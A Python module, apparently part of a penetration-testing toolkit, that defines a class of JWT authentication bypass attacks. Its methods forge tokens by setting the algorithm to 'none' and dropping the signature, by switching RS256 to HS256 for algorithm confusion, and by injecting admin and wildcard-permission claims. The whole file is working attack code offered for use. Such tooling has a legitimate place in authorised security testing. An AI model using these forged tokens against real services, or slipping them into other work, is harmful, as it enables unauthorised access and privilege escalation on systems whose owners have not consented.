"""
JWT Authentication Bypass Attacks
"""

import json
import base64
from typing import List, Dict

class JWTAttacks:
    @staticmethod
    def none_algorithm(token: str) -> str:
        """Change algorithm to 'none' to bypass signature verification"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            header['alg'] = 'none'
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            return f"{new_header}.{parts[1]}."
        except:
            return token
    
    @staticmethod
    def algorithm_confusion(token: str) -> str:
        """Change RS256 to HS256 for algorithm confusion attack"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            header['alg'] = 'HS256'
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            return f"{new_header}.{parts[1]}.{parts[2]}"
        except:
            return token
    
    @staticmethod
    def privilege_escalation(token: str) -> List[str]:
        """Modify JWT claims for privilege escalation"""
        variants = []
        try:
            parts = token.split('.')
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Try different privilege escalation payloads
            escalations = [
                {'role': 'admin'},
                {'is_admin': True},
                {'admin': True},
                {'role': ['admin', 'user']},
                {'permissions': ['*']}
            ]
            
            for esc in escalations:
                new_payload = {**payload, **esc}
                new_payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).decode().rstrip('=')
                variants.append(f"{parts[0]}.{new_payload_b64}.")
        except:
            pass
        
        return variants
